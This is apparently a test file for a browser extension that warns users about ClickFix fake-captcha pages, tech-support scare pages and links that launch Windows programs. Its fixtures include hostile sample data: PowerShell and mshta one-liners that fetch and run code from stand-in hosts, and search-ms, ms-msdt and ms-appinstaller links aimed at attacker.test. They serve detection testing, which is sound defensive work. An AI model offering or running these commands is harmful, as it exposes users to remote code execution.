/** @vitest-environment happy-dom */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

import type { BannerHandle, BannerHandlers, BannerProps } from '@okolos/ui'

import { createSurfaceSlot, type SurfaceSlot } from './surface-slot.js'
import { lentShadowRoot, watchForTraps, type TrapDeps, type TrapWatcher } from './traps.js'

const CLICKFIX_TEXT =
  'Verify you are human: press Win + R, then Ctrl + V, then press Enter.'
const SCARE_TEXT =
  'SECURITY ALERT: your computer has been locked. Windows Defender found a trojan. Call technical support immediately on +1 (888) 555-0142.'

let watcher: TrapWatcher | null = null

type Watched = TrapDeps & {
  exitFullscreen: ReturnType<typeof vi.fn>
  warned: ReturnType<typeof vi.fn>
}

function watch(overrides: Partial<TrapDeps> = {}): Watched {
  const deps = {
    doc: document,
    text: () => document.body.textContent ?? '',
    leave: vi.fn(),
    recover: vi.fn(),
    exitFullscreen: vi.fn(),
    warned: vi.fn(),
    ...overrides,
  } as Watched
  watcher = watchForTraps(deps)
  return deps
}

/** Waits past the watcher's debounce. */
const settle = () => new Promise<void>((resolve) => setTimeout(resolve, 600))

const banner = () => document.querySelector('okolos-banner')

beforeEach(() => {
  document.body.innerHTML = ''
})

afterEach(() => {
  watcher?.stop()
  watcher = null
})

describe('a page that copies a command for you', () => {
  it('interrupts, because the next action is a paste into a run box', async () => {
    document.body.textContent = CLICKFIX_TEXT
    watch()
    document.dispatchEvent(new Event('copy', { bubbles: true }))
    await settle()

    expect(banner()).not.toBeNull()
  })

  it('says the copied text could not be read rather than showing an empty box', async () => {
    document.body.textContent = CLICKFIX_TEXT
    watch()
    document.dispatchEvent(new Event('copy', { bubbles: true }))
    await settle()

    expect(document.body.innerHTML).toBeTruthy()
    expect(banner()).not.toBeNull()
  })

  it('does not claim the page copied it when the user did', async () => {
    // The banner says "this page copied a command for you". On a page the user
    // copied from themselves that sentence is simply untrue, and the signal
    // list is where the claim comes from.
    document.body.textContent = CLICKFIX_TEXT
    const deps = watch()
    const trusted = new Event('copy', { bubbles: true })
    Object.defineProperty(trusted, 'isTrusted', { value: true })
    document.dispatchEvent(trusted)
    await settle()

    expect(deps.warned).toHaveBeenCalled()
    const signals = deps.warned.mock.calls[0]?.[1] as string[]
    expect(signals).not.toContain('copy-not-made-by-you')
  })

  it('leaves a documentation page alone, copy button and all', async () => {
    // The false positive that matters: "copy this, paste it in your terminal,
    // press Enter" with an execCommand copy button behind it is every install
    // page on every developer site.
    document.body.textContent =
      'Install the CLI: copy the command below, paste it into your terminal and press Enter.'
    watch()
    document.dispatchEvent(new Event('copy', { bubbles: true }))
    await settle()

    expect(banner()).toBeNull()
  })
})

describe('a page that takes over the screen', () => {
  it('leaves fullscreen nobody asked for', async () => {
    document.body.textContent = SCARE_TEXT
    const deps = watch()
    Object.defineProperty(document, 'fullscreenElement', {
      configurable: true,
      value: document.body,
    })
    document.dispatchEvent(new Event('fullscreenchange', { bubbles: true }))
    await settle()

    expect(deps.exitFullscreen).toHaveBeenCalled()
    expect(banner()).not.toBeNull()
  })

  it('leaves alone a fullscreen the user just asked for', async () => {
    document.body.textContent = 'Now playing'
    const deps = watch()
    document.dispatchEvent(new KeyboardEvent('keydown', { key: 'f', bubbles: true }))
    Object.defineProperty(document, 'fullscreenElement', {
      configurable: true,
      value: document.body,
    })
    document.dispatchEvent(new Event('fullscreenchange', { bubbles: true }))
    await settle()

    expect(deps.exitFullscreen).not.toHaveBeenCalled()
  })
})

describe('an ordinary page', () => {
  it('is left entirely alone', async () => {
    document.body.textContent = 'Welcome to our shop. Free delivery this week.'
    watch()
    await settle()
    expect(banner()).toBeNull()
  })
})

describe('stopping', () => {
  it('removes the warning and stops listening', async () => {
    document.body.textContent = SCARE_TEXT
    watch()
    await settle()
    expect(banner()).not.toBeNull()

    watcher?.stop()
    expect(banner()).toBeNull()
  })
})

describe('what the banner claims', () => {
  it('does not say the page copied anything before it has', async () => {
    // The medium case is the most useful moment to warn — and the moment when
    // "this page copied a command for you" would be a false statement.
    document.body.textContent = CLICKFIX_TEXT
    const deps = watch()
    await settle()

    expect(deps.warned).toHaveBeenCalled()
    const signals = deps.warned.mock.calls[0]?.[1] as string[]
    expect(signals).not.toContain('copy-not-made-by-you')
  })
})

describe('a link that opens a program outside the browser (B-165)', () => {
  /**
   * The address is read on the click and nowhere else: a page that merely carries a
   * `search-ms:` link has done nothing yet, and a warning on arrival would fire on
   * pages nobody was going to click through. The click is where the browser hands the
   * address to Windows, so it is held there.
   */
  type Mounted = { props: BannerProps; handlers: BannerHandlers }

  function mounted(): {
    mounts: Mounted[]
    mountWarning: (props: BannerProps, handlers: BannerHandlers) => BannerHandle
  } {
    const mounts: Mounted[] = []
    const mountWarning = (props: BannerProps, handlers: BannerHandlers): BannerHandle => {
      mounts.push({ props, handlers })
      const host = document.createElement('div')
      return {
        host,
        root: host.attachShadow({ mode: 'open' }),
        showError: () => undefined,
        alsoHere: () => undefined,
        destroy: () => undefined,
      }
    }
    return { mounts, mountWarning }
  }

  function link(href: string): HTMLAnchorElement {
    const anchor = document.createElement('a')
    anchor.setAttribute('href', href)
    anchor.textContent = 'Open the invoice'
    document.body.append(anchor)
    return anchor
  }

  function click(target: Element, type: 'click' | 'auxclick' = 'click'): MouseEvent {
    const event = new MouseEvent(type, { bubbles: true, cancelable: true, button: type === 'auxclick' ? 1 : 0 })
    target.dispatchEvent(event)
    return event
  }

  it('stops the click and says a program would open', () => {
    const { mounts, mountWarning } = mounted()
    const deps = watch({ mountWarning })
    const event = click(link('search-ms:query=invoice&crumb=location:%5C%5Cfiles.attacker.test%5Cshare'))

    expect(event.defaultPrevented).toBe(true)
    expect(mounts).toHaveLength(1)
    expect(mounts[0]?.props).toMatchObject({ variant: 'clickfix', severity: 'critical' })
    expect(mounts[0]?.props.headline).toBe('[warnOutsideLinkHeadline]')
    expect(mounts[0]?.props.detail).toContain('[warnOutsideLinkProgram]')
    expect(mounts[0]?.props.detail).toContain('[warnOutsideLinkWhere]')
    expect(mounts[0]?.props.detail).toContain('[warnOutsideLinkStopped]')
    expect(deps.warned).toHaveBeenCalledWith('outside-link', ['search-ms', 'opens-a-program'])
  })

  it('leaves a file address with a host to the browser, which refuses it from a page', () => {
    // Chromium and Firefox refuse a `file:` navigation from an http(s) page on their
    // own; a warning that a shared folder opens would describe what cannot happen.
    const { mounts, mountWarning } = mounted()
    const deps = watch({ mountWarning })
    const event = click(link('file://fileserver.attacker.test/share/invoice.lnk'))

    expect(event.defaultPrevented).toBe(false)
    expect(mounts).toHaveLength(0)
    expect(deps.warned).not.toHaveBeenCalled()
  })

  it('stops a click a script made, the way an agent or a page would click', () => {
    // `HTMLElement.click()` dispatches an untrusted click with the same default
    // action; the gate holds it only on a page with a finding, this holds it anywhere.
    const { mounts, mountWarning } = mounted()
    watch({ mountWarning })
    const anchor = link('ms-msdt:/id PCWDiagnostic /skip force')
    let reached = false
    anchor.addEventListener('click', (event) => {
      reached = event.defaultPrevented
    })
    anchor.click()

    expect(reached).toBe(true)
    expect(mounts).toHaveLength(1)
  })

  it('stops the middle click too, which opens the address in a new tab', () => {
    const { mounts, mountWarning } = mounted()
    watch({ mountWarning })
    expect(click(link('ms-appinstaller:?source=https://cdn.attacker.test/a.msix'), 'auxclick').defaultPrevented).toBe(
      true,
    )
    expect(mounts).toHaveLength(1)
  })

  it('reads the link the click landed inside, not only the anchor itself', () => {
    const { mounts, mountWarning } = mounted()
    watch({ mountWarning })
    const anchor = link('search-ms:query=x')
    const inner = document.createElement('span')
    anchor.append(inner)
    expect(click(inner).defaultPrevented).toBe(true)
    expect(mounts).toHaveLength(1)
  })

  it('lets the person through after "This is wrong", for that link on this page', () => {
    const { mounts, mountWarning } = mounted()
    watch({ mountWarning })
    const anchor = link('search-ms:query=x')
    click(anchor)
    mounts[0]?.handlers.onDispute()

    expect(click(anchor).defaultPrevented).toBe(false)
    // A different link is a different decision.
    expect(click(link('ms-msdt:/id x')).defaultPrevented).toBe(true)
  })

  it('leaves when the person chooses to', () => {
    const { mounts, mountWarning } = mounted()
    const deps = watch({ mountWarning })
    click(link('search-ms:query=x'))
    mounts[0]?.handlers.onPrimary()
    expect(deps.leave).toHaveBeenCalled()
  })

  it('leaves ordinary links and the "open in the desktop app" link alone', () => {
    const { mounts, mountWarning } = mounted()
    watch({ mountWarning })
    for (const href of [
      'https://example.test/a',
      'mailto:a@example.test',
      'ms-word:ofe|u|https://contoso.sharepoint.com/a.docx',
      'file:///C:/Users/me/a.pdf',
    ]) {
      expect(click(link(href)).defaultPrevented, href).toBe(false)
    }
    expect(mounts).toHaveLength(0)
  })

  it('leaves a right click alone, which opens a menu and not the link', () => {
    // Chromium fires auxclick with button 2 after contextmenu; a person copying the
    // address from the menu met a blocking warning and a false journal line.
    const { mounts, mountWarning } = mounted()
    const deps = watch({ mountWarning })
    const anchor = link('search-ms:query=x')
    for (const [type, button] of [['auxclick', 2], ['click', 2], ['auxclick', 3], ['auxclick', 4]] as const) {
      const event = new MouseEvent(type, { bubbles: true, cancelable: true, button })
      anchor.dispatchEvent(event)
      expect(event.defaultPrevented, `${type} ${button}`).toBe(false)
    }
    expect(mounts).toHaveLength(0)
    expect(deps.warned).not.toHaveBeenCalled()
  })

  it('journals a link once per page however often it is clicked', () => {
    // A page looping element.click() wrote one "What changed" row per click.
    const { mounts, mountWarning } = mounted()
    const deps = watch({ mountWarning })
    const anchor = link('ms-msdt:/id PCWDiagnostic')
    const prevented: boolean[] = []
    for (let i = 0; i < 100; i += 1) prevented.push(click(anchor).defaultPrevented)

    expect(prevented.every(Boolean)).toBe(true)
    expect(deps.warned).toHaveBeenCalledTimes(1)
    expect(mounts).toHaveLength(1)

    click(link('search-ms:query=x'))
    expect(deps.warned).toHaveBeenCalledTimes(2)
  })

  it('finds a link inside an open shadow root, where the click is retargeted to the host', () => {
    // A listener on the document sees the shadow host as the target; the browser's
    // composed path still carries the link (measured in Chromium and WebKit).
    const { mounts, mountWarning } = mounted()
    watch({ mountWarning })
    const host = document.createElement('div')
    document.body.append(host)
    const root = host.attachShadow({ mode: 'open' })
    const anchor = document.createElement('a')
    anchor.setAttribute('href', 'search-ms:query=x')
    root.append(anchor)

    const event = new MouseEvent('click', { bubbles: true, cancelable: true, composed: true, button: 0 })
    const path = [anchor, root, host, document.body, document.documentElement, document, window]
    Object.defineProperty(event, 'composedPath', { value: () => path })
    host.dispatchEvent(event)

    expect(event.defaultPrevented).toBe(true)
    expect(mounts).toHaveLength(1)
  })

  it('finds a link inside a closed shadow root through the root the browser lends an extension', () => {
    // A closed root hides the link from the composed path as well; the extension
    // APIs (chrome.dom.openOrClosedShadowRoot, Element.openOrClosedShadowRoot in
    // Firefox) lend the root, and the link is the one under the pointer or focused.
    const { mounts, mountWarning } = mounted()
    const host = document.createElement('div')
    document.body.append(host)
    const root = host.attachShadow({ mode: 'closed' })
    const anchor = document.createElement('a')
    anchor.setAttribute('href', 'ms-msdt:/id x')
    root.append(anchor)
    watch({ mountWarning, shadowRootOf: (element) => (element === host ? root : null) })

    const closedPath = [host, document.body, document.documentElement, document, window]
    const send = (init: MouseEventInit) => {
      const event = new MouseEvent('click', { bubbles: true, cancelable: true, composed: true, ...init })
      Object.defineProperty(event, 'composedPath', { value: () => closedPath })
      host.dispatchEvent(event)
      return event
    }

    // The pointer: what is under it inside the root.
    Object.defineProperty(root, 'elementFromPoint', {
      configurable: true,
      value: (x: number, y: number) => (x === 40 && y === 12 ? anchor : null),
    })
    expect(send({ button: 0, clientX: 40, clientY: 12, detail: 1 }).defaultPrevented).toBe(true)

    // The keyboard: Enter on the focused link, which a click with no pointer carries.
    Object.defineProperty(root, 'elementFromPoint', { configurable: true, value: () => null })
    anchor.focus()
    expect(send({ button: 0 }).defaultPrevented).toBe(true)
    expect(mounts).toHaveLength(1)
  })

  it('lets every link through on a site in Trusted sites, and journals nothing', async () => {
    // Round 2: an intranet serving Office documents over http met a blocking warning on
    // every "open in the desktop app" link, even after the person trusted the site.
    const { mounts, mountWarning } = mounted()
    const deps = watch({ mountWarning, trusted: async () => true })
    await Promise.resolve()
    await Promise.resolve()

    expect(click(link('ms-word:ofe|u|http://intranet.test/a.docx')).defaultPrevented).toBe(false)
    expect(click(link('search-ms:query=x')).defaultPrevented).toBe(false)
    expect(mounts).toHaveLength(0)
    expect(deps.warned).not.toHaveBeenCalled()
  })

  it('holds the click while Trusted sites has not answered, and reads it again after', async () => {
    const { mounts, mountWarning } = mounted()
    let answer = false
    watch({ mountWarning, trusted: async () => answer })
    // Before the first answer the site counts as not trusted: a click is held.
    expect(click(link('search-ms:query=1')).defaultPrevented).toBe(true)
    await new Promise((resolve) => setTimeout(resolve, 0))

    // The person trusts the site (from a lookalike panel, say); the next stopped click
    // asks again, and the click after it goes through.
    answer = true
    mounts[0]?.handlers.onDismiss()
    expect(click(link('search-ms:query=2')).defaultPrevented).toBe(true)
    await new Promise((resolve) => setTimeout(resolve, 0))
    expect(click(link('search-ms:query=3')).defaultPrevented).toBe(false)
  })

  it('a site whose Trusted sites answer fails is not trusted', async () => {
    const { mountWarning } = mounted()
    watch({ mountWarning, trusted: async () => Promise.reject(new Error('no answer')) })
    await new Promise((resolve) => setTimeout(resolve, 0))
    expect(click(link('search-ms:query=x')).defaultPrevented).toBe(true)
  })

  it('journals at most five different links on one page, and still stops every click', () => {
    // A page clicking search-ms:query=1, =2, … wrote one "What changed" row per address.
    const { mountWarning } = mounted()
    const deps = watch({ mountWarning })
    const prevented: boolean[] = []
    for (let i = 0; i < 12; i += 1) prevented.push(click(link(`search-ms:query=${i}`)).defaultPrevented)

    expect(prevented.every(Boolean)).toBe(true)
    expect(deps.warned).toHaveBeenCalledTimes(5)
  })

  it('stops listening when the watcher stops', () => {
    const { mounts, mountWarning } = mounted()
    watch({ mountWarning })
    watcher?.stop()
    watcher = null
    expect(click(link('search-ms:query=x')).defaultPrevented).toBe(false)
    expect(mounts).toHaveLength(0)
  })
})

describe('the trap warnings through the real surface slot (B-165, round 1)', () => {
  /**
   * The stubbed mount above never went through the slot, which is how "This is wrong"
   * passed every test while doing nothing in the product: the slot's watch put the
   * panel straight back.
   */
  const realWait = (ms: number) => new Promise<void>((resolve) => setTimeout(resolve, ms))
  const slots: SurfaceSlot[] = []

  afterEach(() => {
    for (const slot of slots) slot.release()
    slots.length = 0
  })

  function slotted(): SurfaceSlot {
    const slot = createSurfaceSlot({
      doc: document,
      noteRefused: () => undefined,
      escalate: vi.fn(async () => undefined),
      alsoLine: (kinds) => `also here: ${kinds.join(', ')}`,
      wait: realWait,
    })
    slots.push(slot)
    return slot
  }

  const trapMount = (slot: SurfaceSlot) => slot.mountFor('trap', 'critical')
  const panels = () => document.querySelectorAll('[data-okolos=banner]').length
  const shown = (slot: SurfaceSlot) => slot.current()?.root.querySelector('[data-role=headline]')?.textContent ?? null
  const press = (slot: SurfaceSlot, role: string) =>
    (slot.current()?.root.querySelector(`[data-role=${role}]`) as HTMLButtonElement | null)?.click()

  function link(href: string): HTMLAnchorElement {
    const anchor = document.createElement('a')
    anchor.setAttribute('href', href)
    anchor.textContent = 'Open the invoice'
    document.body.append(anchor)
    return anchor
  }

  function copyOf(payload: string): Event {
    const event = new Event('copy', { bubbles: true })
    Object.defineProperty(event, 'clipboardData', { value: { getData: () => payload } })
    return event
  }

  it('"This is wrong" closes the outside-link warning, and it stays closed', async () => {
    const slot = slotted()
    watch({ mountWarning: trapMount(slot) })
    const anchor = link('search-ms:query=x')
    anchor.click()
    expect(shown(slot)).toBe('[warnOutsideLinkHeadline]')

    press(slot, 'dispute')
    await realWait(1000)

    expect(panels()).toBe(0)
    expect(slot.current()).toBeNull()
    // That one link now goes through; the person said so.
    const again = new MouseEvent('click', { bubbles: true, cancelable: true, button: 0 })
    anchor.dispatchEvent(again)
    expect(again.defaultPrevented).toBe(false)
  })

  it('"This is wrong" closes the ClickFix warning, and it stays closed (SCN-008)', async () => {
    document.body.textContent = CLICKFIX_TEXT
    const slot = slotted()
    watch({ mountWarning: trapMount(slot) })
    document.dispatchEvent(copyOf('powershell -w hidden -c "iex(irm http://x.test/a)"'))
    await settle()
    expect(shown(slot)).toBe('[warnClickfixCopied]')

    press(slot, 'dispute')
    await realWait(1000)
    expect(panels()).toBe(0)
    expect(slot.current()).toBeNull()
  })

  it('"This is wrong" closes the tech-support warning, and it stays closed (SCN-009)', async () => {
    document.body.textContent = SCARE_TEXT
    const slot = slotted()
    const deps = watch({ mountWarning: trapMount(slot) })
    deps.doc.defaultView?.dispatchEvent(new Event('beforeunload'))
    await settle()
    expect(shown(slot)).toBe('[warnTechsupportHeadline]')

    press(slot, 'dispute')
    await realWait(1000)
    expect(panels()).toBe(0)
  })

  it('a fake-captcha page that opens search-ms: and copies a payload ends on the ClickFix warning', async () => {
    // The FileFix shape: one click both copies the command and opens Explorer. The
    // link warning goes up first; the ClickFix verdict is the more urgent sentence
    // and takes the panel, and it is journalled.
    document.body.textContent = CLICKFIX_TEXT
    const slot = slotted()
    const deps = watch({ mountWarning: trapMount(slot) })
    const anchor = link('search-ms:query=invoice&crumb=location:%5C%5Cfiles.attacker.test%5Cshare')
    anchor.addEventListener('click', () => {
      document.dispatchEvent(copyOf('powershell -w hidden -c "iex(irm http://x.test/a)"'))
    })
    // Clicked before the watcher's first look at the page. A person who had already
    // disputed the ClickFix warning on this page would not see it again (SCN-008); that
    // is a separate test below, and this one is the FileFix click itself.
    anchor.click()
    await settle()

    expect(panels()).toBe(1)
    expect(shown(slot)).toBe('[warnClickfixCopied]')
    expect(deps.warned).toHaveBeenCalledWith('clickfix', expect.arrayContaining(['copy-not-made-by-you']))
    expect(deps.warned).toHaveBeenCalledWith('outside-link', ['search-ms', 'opens-a-program'])
  })

  it('counts a copy the page makes inside a held link click as the page\'s, as a real browser sends it', async () => {
    // execCommand('copy') in the page's click handler fires a trusted copy event in
    // Chromium, so the FileFix page ended on the link warning in the e2e walk. The
    // person clicked a link, not Copy: a copy inside that click is the page's doing.
    // The event's own data is empty for an execCommand copy, so the warning says it
    // could not be read rather than showing an empty box.
    document.body.textContent = CLICKFIX_TEXT
    const slot = slotted()
    const deps = watch({ mountWarning: trapMount(slot) })

    const anchor = link('search-ms:query=x')
    anchor.addEventListener('click', () => {
      const trusted = new Event('copy', { bubbles: true })
      Object.defineProperty(trusted, 'isTrusted', { value: true })
      Object.defineProperty(trusted, 'clipboardData', { value: { getData: () => '' } })
      document.dispatchEvent(trusted)
    })
    anchor.click()
    await settle()

    expect(shown(slot)).toBe('[warnClickfixCopied]')
    expect(slot.current()?.root.querySelector('[data-role=detail]')?.textContent).toContain('[warnClickfixUnreadable]')
    expect(deps.warned).toHaveBeenCalledWith('clickfix', expect.arrayContaining(['copy-not-made-by-you']))
  })

  it('still ignores a trusted copy outside a held link click (the person\'s own)', async () => {
    // Read on the warning it would raise: the person's own copy leaves the medium
    // sentence ("wants you to"), never the claim that the page copied something.
    document.body.textContent = CLICKFIX_TEXT
    const slot = slotted()
    const deps = watch({ mountWarning: trapMount(slot) })

    const trusted = new Event('copy', { bubbles: true })
    Object.defineProperty(trusted, 'isTrusted', { value: true })
    document.dispatchEvent(trusted)
    await settle()
    expect(shown(slot)).toBe('[warnClickfixWants]')
    expect(deps.warned).not.toHaveBeenCalledWith('clickfix', expect.arrayContaining(['copy-not-made-by-you']))
  })

  it('a ClickFix copy replaces a standing outside-link warning on an ordinary-looking page', async () => {
    const slot = slotted()
    const deps = watch({ mountWarning: trapMount(slot) })
    link('ms-msdt:/id x').click()
    expect(shown(slot)).toBe('[warnOutsideLinkHeadline]')

    document.body.append(document.createTextNode(` ${CLICKFIX_TEXT}`))
    document.dispatchEvent(copyOf('mshta https://x.test/verify.hta'))
    await settle()

    expect(panels()).toBe(1)
    expect(shown(slot)).toBe('[warnClickfixCopied]')
    expect(deps.warned).toHaveBeenCalledWith('clickfix', expect.any(Array))
  })

  it('never holds another module\'s panel as its own', async () => {
    // Seam break 4: an injection warning held the slot, the refused claim handed back
    // its handle, and the watcher kept it as its own. After the person closed that
    // panel every outside link was stopped with no panel, and ClickFix stayed silent.
    const slot = slotted()
    const injection = slot.claim({
      kind: 'injection',
      severity: 'critical',
      props: { variant: 'injection', severity: 'critical', headline: 'injection', detail: '', sourceLine: '' },
      handlers: { onPrimary: () => {}, onRetry: () => {}, onDispute: () => {}, onDismiss: () => {} },
    })
    const deps = watch({ mountWarning: trapMount(slot) })
    const anchor = link('search-ms:query=x')

    anchor.click()
    expect(shown(slot)).toBe('injection')
    expect(slot.waiting()).toEqual(['trap'])

    injection.destroy()
    await realWait(400)
    expect(slot.current()).toBeNull()

    const second = new MouseEvent('click', { bubbles: true, cancelable: true, button: 0 })
    anchor.dispatchEvent(second)
    expect(second.defaultPrevented).toBe(true)
    expect(shown(slot)).toBe('[warnOutsideLinkHeadline]')

    document.body.append(document.createTextNode(` ${CLICKFIX_TEXT}`))
    document.dispatchEvent(copyOf('powershell iex x'))
    await settle()
    expect(deps.warned).toHaveBeenCalledWith('clickfix', expect.any(Array))
    expect(shown(slot)).toBe('[warnClickfixCopied]')
  })

  it('"This is wrong" on ClickFix is remembered for the page: a second copy raises nothing (SCN-008)', async () => {
    // Round 2: the next scripted copy raised the warning again and wrote a second
    // journal line, while SCN-008 said the warning closes for this page.
    document.body.textContent = CLICKFIX_TEXT
    const slot = slotted()
    const deps = watch({ mountWarning: trapMount(slot) })
    document.dispatchEvent(copyOf('powershell -w hidden -c "iex(irm http://x.test/a)"'))
    await settle()
    expect(shown(slot)).toBe('[warnClickfixCopied]')

    press(slot, 'dispute')
    document.dispatchEvent(copyOf('mshta https://x.test/verify.hta'))
    await settle()

    expect(panels()).toBe(0)
    expect(deps.warned.mock.calls.filter(([kind]) => kind === 'clickfix')).toHaveLength(1)
  })

  it('"This is wrong" on tech-support is remembered for the page: a second forced fullscreen raises nothing (SCN-009)', async () => {
    document.body.textContent = SCARE_TEXT
    const slot = slotted()
    const deps = watch({ mountWarning: trapMount(slot) })
    await settle()
    expect(shown(slot)).toBe('[warnTechsupportHeadline]')

    press(slot, 'dispute')
    Object.defineProperty(document, 'fullscreenElement', { configurable: true, value: document.body })
    document.dispatchEvent(new Event('fullscreenchange', { bubbles: true }))
    await settle()
    Object.defineProperty(document, 'fullscreenElement', { configurable: true, value: null })

    expect(panels()).toBe(0)
    expect(deps.warned.mock.calls.filter(([kind]) => kind === 'techsupport')).toHaveLength(1)
  })

  it('a disputed ClickFix leaves the link warning standing on the FileFix click', async () => {
    document.body.textContent = CLICKFIX_TEXT
    const slot = slotted()
    const deps = watch({ mountWarning: trapMount(slot) })
    await settle()
    expect(shown(slot)).toBe('[warnClickfixWants]')
    press(slot, 'dispute')

    const anchor = link('search-ms:query=x')
    anchor.addEventListener('click', () => {
      document.dispatchEvent(copyOf('powershell -w hidden -c "iex(irm http://x.test/a)"'))
    })
    anchor.click()
    await settle()

    expect(shown(slot)).toBe('[warnOutsideLinkHeadline]')
    expect(deps.warned.mock.calls.filter(([kind]) => kind === 'clickfix')).toHaveLength(1)
  })

  it('ClickFix taking the panel from the link warning keeps what stood behind it (seam, round 2)', async () => {
    // A lookalike the link warning pushed aside vanished when ClickFix took over: the
    // link panel's close emptied the list, and lookalike runs once per page.
    const slot = slotted()
    slot.claim({
      kind: 'lookalike',
      severity: 'major',
      props: { variant: 'lookalike', severity: 'major', headline: 'lookalike', detail: '', sourceLine: '' },
      handlers: { onPrimary: () => {}, onRetry: () => {}, onDispute: () => {}, onDismiss: () => {} },
    })
    watch({ mountWarning: trapMount(slot) })
    link('search-ms:query=x').click()
    expect(shown(slot)).toBe('[warnOutsideLinkHeadline]')
    expect(slot.waiting()).toEqual(['lookalike'])

    document.body.append(document.createTextNode(` ${CLICKFIX_TEXT}`))
    document.dispatchEvent(copyOf('powershell iex x'))
    await settle()

    expect(shown(slot)).toBe('[warnClickfixCopied]')
    expect(slot.waiting()).toEqual(['lookalike'])
    expect(slot.current()?.root.querySelector('[data-role=also]')?.textContent).toContain('lookalike')
  })

  it('an injection refused while the link warning is up is still listed after ClickFix takes over (unit, round 2)', async () => {
    const slot = slotted()
    watch({ mountWarning: trapMount(slot) })
    link('ms-msdt:/id x').click()
    slot.claim({
      kind: 'injection',
      severity: 'major',
      props: { variant: 'injection', severity: 'major', headline: 'injection', detail: '', sourceLine: '' },
      handlers: { onPrimary: () => {}, onRetry: () => {}, onDispute: () => {}, onDismiss: () => {} },
    })
    expect(slot.waiting()).toEqual(['injection'])

    document.body.append(document.createTextNode(` ${CLICKFIX_TEXT}`))
    document.dispatchEvent(copyOf('powershell iex x'))
    await settle()

    expect(shown(slot)).toBe('[warnClickfixCopied]')
    expect(slot.waiting()).toEqual(['injection'])
  })

  it('a panel released from outside is not held on to: the next outside link is drawn (seam, round 2)', () => {
    // The inspector's "This is wrong" calls slot.release() with no kind. The watcher
    // kept its handle and stopped every later outside link with no panel.
    const slot = slotted()
    watch({ mountWarning: trapMount(slot) })
    link('search-ms:query=x').click()
    expect(shown(slot)).toBe('[warnOutsideLinkHeadline]')

    slot.release()
    expect(slot.current()).toBeNull()

    const second = new MouseEvent('click', { bubbles: true, cancelable: true, button: 0 })
    link('ms-msdt:/id x').dispatchEvent(second)
    expect(second.defaultPrevented).toBe(true)
    expect(shown(slot)).toBe('[warnOutsideLinkHeadline]')
  })

  it('a ClickFix panel released from outside does not leave ClickFix silent', async () => {
    document.body.textContent = CLICKFIX_TEXT
    const slot = slotted()
    watch({ mountWarning: trapMount(slot) })
    document.dispatchEvent(copyOf('powershell iex x'))
    await settle()
    expect(shown(slot)).toBe('[warnClickfixCopied]')

    slot.release()
    document.dispatchEvent(copyOf('mshta https://x.test/verify.hta'))
    await settle()
    expect(shown(slot)).toBe('[warnClickfixCopied]')
  })

  it('moves focus to "Leave this page" when the warning opens, and back to the link when it closes', async () => {
    // A keyboard user pressed Enter on the link and stayed on it, under a full-page
    // panel: fourteen Tabs through covered page links before the warning's first button.
    const slot = slotted()
    watch({ mountWarning: trapMount(slot) })
    const anchor = link('search-ms:query=x')
    anchor.focus()
    anchor.click()

    const root = slot.current()?.root
    expect(root?.activeElement?.getAttribute('data-role')).toBe('primary')

    press(slot, 'dispute')
    expect(document.activeElement).toBe(anchor)
  })
})

describe('the shadow root an extension may read', () => {
  afterEach(() => {
    delete (globalThis as { chrome?: unknown }).chrome
  })

  it('asks chrome.dom for a closed root where Chromium lends it', () => {
    const host = document.createElement('div')
    const root = host.attachShadow({ mode: 'closed' })
    ;(globalThis as { chrome?: unknown }).chrome = { dom: { openOrClosedShadowRoot: (e: Element) => (e === host ? root : null) } }
    expect(lentShadowRoot(host)).toBe(root)
  })

  it('reads Firefox\'s openOrClosedShadowRoot, and an open root anywhere', () => {
    const closedHost = document.createElement('div')
    const closed = closedHost.attachShadow({ mode: 'closed' })
    Object.defineProperty(closedHost, 'openOrClosedShadowRoot', { value: closed })
    expect(lentShadowRoot(closedHost)).toBe(closed)

    const openHost = document.createElement('div')
    const open = openHost.attachShadow({ mode: 'open' })
    expect(lentShadowRoot(openHost)).toBe(open)
    expect(lentShadowRoot(document.createElement('div'))).toBeNull()
  })
})
